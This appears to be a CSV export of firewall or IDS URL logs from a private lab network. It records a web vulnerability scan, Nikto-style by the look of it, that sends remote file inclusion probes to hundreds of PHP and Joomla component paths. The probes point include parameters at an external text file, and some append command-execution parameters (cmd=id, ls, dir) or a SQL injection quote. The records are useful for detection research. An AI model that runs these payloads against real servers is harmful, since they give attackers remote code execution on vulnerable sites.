ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/community/Offline.php?sourcedir=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/calendar/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/calendar/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_ajaxchat/tests/ajcuser.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_artforms/assets/captcha/includes/captchaform/imgcaptcha.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_artforms/assets/captcha/includes/captchaform/mp3captcha.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_artforms/assets/captcha/includes/captchatalk/swfmovie.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_calendar.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_cpg/cpg.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_facileforms/facileforms.frame.php?ff_compath=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_forum/download.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_galleria/galleria.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_guestbook.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_hashcash/server.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_jd-wiki/bin/dwpage.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_jd-wiki/bin/wantedpages.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_joomlaboard/file_upload.php?sbp=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_koesubmit/koesubmit.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_lm/archive.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_mambowiki/MamboLogin.php?IP=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_minibb.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_mospray/scripts/admin.php?basedir=http://cirt.net/rfiinc.txt??&cmd=id
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_mp3_allopass/allopass.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_rsgallery2/rsgallery.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_smf/smf.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415449,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/core/connect.php?language_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/minibb/bb_plugins.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/minibb/index.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/minibb/index.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/components/xmlparser/loadparser.php?absoluteurl=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/compteur/mapage.php?chemin=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/conf.php?securelib=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/conf.php?securelib=http://cirt.net/rfiinc.txt??
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.inc.php3?rel_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.inc.php?_path=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.inc.php?path_escape=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.inc.php?path_escape=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?full_path=http://cirt.net/rfiinc.txt??
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?full_path_to_db=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?fullpath=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?incpath=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?path_to_root=http://cirt.net/rfiinc.txt?
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?rel_path=http://cirt.net/rfiinc.txt??
9999,415450,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?rel_path=http://cirt.net/rfiinc.txt??
9999,415451,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?returnpath=http://cirt.net/rfiinc.txt?
9999,415451,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?sql_language=http://cirt.net/rfiinc.txt??&cmd=0wn3d%20By%20Dr
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?xcart_dir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config.php?xcart_dir=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config/config_admin.php?INC=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config/config_main.php?INC=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config/config_member.php?INC=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config/dbutil.bck.php?confdir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config/mysql_config.php?INC=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/config/sender.php?ROOT_PATH=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/configuration.php?absolute_path=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/confirmUnsubscription.php?output=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/connect.php?path=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/connexion.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contact.php?blog_theme=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contacts.php?cal_dir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contenido/external/frontend/news.php?cfg[path][includes]=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/content.php?content=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/content/admin.php?pwfile=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/content/content.php?fileloc=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/content/delete.php?pwfile=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/content/modify.php?pwfile=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/content/modify_go.php?pwfile=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contrib/forms/evaluation/C_FormEvaluation.class.php?GLOBALS[fileroot]=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contrib/mx_glance_sdesc.php?mx_root_path=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/contrib/phpBB2/modules.php?phpbb_root_path=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/controllers/MySQLController.php?baseDir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/controllers/SQLController.php?baseDir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/controllers/SetupController.php?baseDir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/controllers/VideoController.php?baseDir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/controllers/ViewController.php?baseDir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/convert-date.php?cal_dir=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/convert/mvcw.php?step=1&vwar_root=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/convert/mvcw.php?vwar_root=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/admin.php?p=admin&absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/categories.php?categoriesenabled=yes&do=categories&action=del&absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/categories_add.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/categories_remove.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/edit.php?p=admin&do=edit&c=ok&absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/editdel.php?p=admin&absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/ftpfeature.php?p=admin&absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/login.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/pgRSSnews.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/showcat.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/admin/upload.php?p=admin&do=upload&c=ok&absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/archive_cat.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/archive_nocat.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/aural.php?site_absolute_path=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/aural.php?site_absolute_path=http://cirt.net/rfiinc.txt??&cmd=dir
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/editor.php?editor_insert_bottom=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/includes.php?CMS_ROOT=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/core/recent_list.php?absoluteurlhttp://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/corpo.php?pagina=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cp2.php?securelib=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cp2.php?securelib=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cpe/index.php?repertoire_config=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/crea.php?plancia=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/creacms/_administration/edition_article/edition_article.php?cfg[document_uri]=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/creacms/_administration/fonctions/get_liste_langue.php?cfg[base_uri_admin]=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/creat_news_all.php?language=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/create_file.php?target=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cron.php?ROOT_PATH=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cron.php?include_path=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt??
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cross.php?url=http://cirt.net/rfiinc.txt?
9999,415452,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cross.php?url=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/custom_vars.php?sys[path_addon]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/customer/product.php?xcart_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/cwb/comanda.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/datei.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/db/PollDB.php?CONFIG_DATAREADERWRITER=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/db/mysql/db.inc.php?SPL_CFG[dirroot]=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dbcommon/include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dbmodules/DB_adodb.class.php?PHPOF_INCLUDE_PATH=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/debugger.php?config_atkroot=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/decoder/gallery.php?ccms_library_path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/decoder/markdown.php?ccms_library_path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/defaults_setup.php?ROOT_PATH=http://cirt.net/rfiinc.txt??cmd=ls
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/defines.php?WEBCHATPATH=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/demo/ms-pe02/catalog.php?cid=0&sid='
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/depouilg.php3?NomVote=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/development.php?root_prefix=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/development.php?root_prefix=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dfcode.php?DFORUM_PATH=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?set_depth=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialog.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialogs/a.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialogs/collorpicker.php?spaw_dir=http://cirt.net/rfiinc.txt?&cmd=id
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialogs/img.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialogs/img_library.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialogs/table.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dialogs/td.php?spaw_dir=http://cirt.net/rfiinc.txt??&cmd=id
